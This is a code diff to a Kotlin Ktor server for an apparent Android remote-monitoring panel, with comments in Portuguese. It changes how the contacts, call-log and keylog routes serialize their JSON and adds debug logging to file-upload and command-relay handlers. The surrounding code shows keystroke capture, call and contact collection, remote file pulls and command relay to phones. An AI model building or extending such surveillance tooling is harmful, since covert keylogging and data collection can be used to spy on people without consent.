@@ -1468,7 +1468,14 @@ fun main() {
                             "syncedAt" to it[ContactsTable.syncedAt]
                         )}
                 }
-                call.respond(rows)
+                // Serializa manualmente: respond(rows) quebrava com kotlinx
+                // ("ArrayList is not registered for polymorphic serialization")
+                // e enchia o log de stacktraces.
+                call.respondText(
+                    rows.map { r -> r.mapValues { (_, v) -> v.toString() } }
+                        .joinToString(separator = ",", prefix = "[", postfix = "]") { Json.encodeToString(it) },
+                    io.ktor.http.ContentType.Application.Json
+                )
             }
 
             get("/api/device/{id}/call-logs") {
@@ -1487,7 +1494,12 @@ fun main() {
                             "timestamp" to it[CallLogsTable.timestamp]
                         )}
                 }
-                call.respond(rows)
+                // Serializa manualmente (mesma justificativa da rota de contatos)
+                call.respondText(
+                    rows.map { r -> r.mapValues { (_, v) -> v.toString() } }
+                        .joinToString(separator = ",", prefix = "[", postfix = "]") { Json.encodeToString(it) },
+                    io.ktor.http.ContentType.Application.Json
+                )
             }
 
             get("/api/device/{id}/keylog") {
@@ -1505,7 +1517,12 @@ fun main() {
                             "timestamp" to it[KeylogTable.timestamp]
                         )}
                 }
-                call.respond(rows)
+                // Serializa manualmente (mesma justificativa da rota de contatos)
+                call.respondText(
+                    rows.map { r -> r.mapValues { (_, v) -> v.toString() } }
+                        .joinToString(separator = ",", prefix = "[", postfix = "]") { Json.encodeToString(it) },
+                    io.ktor.http.ContentType.Application.Json
+                )
             }
 
             // One-time maintenance endpoint: fixes Content-Type metadata on R2 for .opus voice
@@ -2028,6 +2045,7 @@ fun main() {
             // REST Endpoint for Remote File Upload from Android (file browser download)
             post("/upload/file/{id}") {
                 val id = call.parameters["id"] ?: return@post call.respond(mapOf("error" to "Missing device ID"))
+                println("UPLOAD/file recebido: id=$id")
                 if (!isSafeId(id)) return@post call.respond(io.ktor.http.HttpStatusCode.BadRequest, mapOf("error" to "Invalid device ID"))
                 if (!assertUploadAllowed(call, id)) return@post
                 val multipart = call.receiveMultipart()
@@ -2058,6 +2076,7 @@ fun main() {
                 }
 
                 if (savedFile != null) {
+                    println("UPLOAD/file salvo: id=$id file=${savedFile!!.name} tamanho=${savedFile!!.length()}")
                     var fileUrl = "/uploads/$id/files/${savedFile!!.name}"
                     val client = s3Client
                     if (client != null) {
@@ -2604,6 +2623,8 @@ fun main() {
                                 val command = json["command"]?.jsonPrimitive?.content
 
                                 if (destDeviceId != null) {
+                                    // DIAGNOSTICO: log de cada comando recebido do painel
+                                    println("DASH_CMD recebido: cmd=$command dest=$destDeviceId user=$userId owner=$deviceOwnerCache[destDeviceId] online=${deviceSessions[destDeviceId] != null}")
                                     // Verify the dashboard user owns this device before relaying any command.
                                     // Requires: an authenticated session, AND the device already has a
                                     // resolved owner, AND it matches this user — an unauthenticated
@@ -2612,6 +2633,7 @@ fun main() {
                                         DevicesTable.select { DevicesTable.id eq destDeviceId }.firstOrNull()?.get(DevicesTable.ownerId)
                                     }
                                     if (userId <= 0 || devOwner == null || devOwner != userId) {
+                                        println("DASH_CMD negado: cmd=$command dest=$destDeviceId user=$userId owner=$devOwner")
                                         send(packetJson.encodeToString(ErrorPacket(message = "Acesso negado ao dispositivo $destDeviceId")))
                                         continue
                                     }
@@ -2642,7 +2664,9 @@ fun main() {
                                         val devSession = deviceSessions[destDeviceId]
                                         if (devSession != null) {
                                             devSession.send(Frame.Text(text))
+                                            println("DASH_CMD retransmitido: cmd=$command dest=$destDeviceId")
                                         } else {
+                                            println("DASH_CMD offline: cmd=$command dest=$destDeviceId (sem WS do aparelho)")
                                             send(packetJson.encodeToString(ErrorPacket(message = "Device $destDeviceId is offline")))
                                         }
                                     }
@@ -2970,6 +2994,9 @@ fun main() {
 
 // Broadcast only to the dashboard(s) that own the given device
 suspend fun broadcastToDashboards(event: String, deviceId: String? = null) {
+    if (event.contains("\"type\":\"FILE_READY\"")) {
+        println("FILE_READY broadcast: deviceId=$deviceId ownerId=${deviceOwnerCache[deviceId]} dashboardsConectados=${dashboardSessions.size}/${event.take(120)}")
+    }
     val ownerId = if (deviceId != null) deviceOwnerCache[deviceId] else null
     for ((dash, userId) in dashboardSessions) {
         val canReceive = when {
